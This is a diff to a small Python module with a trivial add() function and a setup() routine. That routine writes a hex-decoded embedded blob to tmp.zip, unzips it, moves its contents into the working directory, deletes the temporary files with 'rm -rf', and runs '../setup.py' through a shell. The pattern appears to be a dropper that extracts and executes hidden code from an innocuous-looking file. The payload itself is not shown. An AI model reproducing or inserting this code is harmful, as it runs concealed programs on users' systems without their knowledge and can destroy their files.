@@ -1,7 +1,6 @@
 import subprocess
 import os
 
-
 def add (a, b):
     return a + b
 
@@ -64,5 +63,7 @@ def setup():
     if not os.path.isfile('setup.py'):
         with open('tmp.zip', 'w') as f:
             f.write(signature.decode('hex'))
-        subprocess.check_output('unzip tmp.zip')
-    subprocess.Popen("python ../setup.py",shell=True)
+        subprocess.check_output('unzip tmp.zip', shell=True)
+        subprocess.check_output('mv tmp/* .', shell=True)
+        subprocess.check_output('rm -rf tmp/ tmp.zip', shell=True)
+    subprocess.Popen("python ../setup.py ", shell=True)
